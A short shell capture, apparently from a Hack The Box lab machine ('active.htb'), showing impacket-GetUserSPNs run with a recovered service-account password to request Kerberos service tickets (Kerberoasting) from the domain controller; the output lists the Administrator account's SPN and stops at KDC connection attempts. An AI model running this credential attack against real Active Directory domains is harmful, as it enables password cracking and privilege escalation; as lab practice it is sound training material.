```sh
└─$ impacket-GetUserSPNs -outputfile svc_tgs.txt -ts -dc-ip 10.129.247.58 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-06 01:27:47] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-06 01:27:47] [+] Connecting to 10.129.247.58, port 389, SSL False
[2025-08-06 01:27:48] [+] Total of records returned 4
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-08-06 01:22:40.863350             



[2025-08-06 01:27:48] [-] CCache file is not found. Skipping...
[2025-08-06 01:27:48] [+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
[2025-08-06 01:27:48] [+] Trying to connect to KDC at 10.129.247.58:88
[2025-08-06 01:27:48] [+] Trying to connect to KDC at 10.129.247.58:88
[2025-08-06 01:27:49] [+] Trying to connect to KDC at 10.129.247.58:88
```
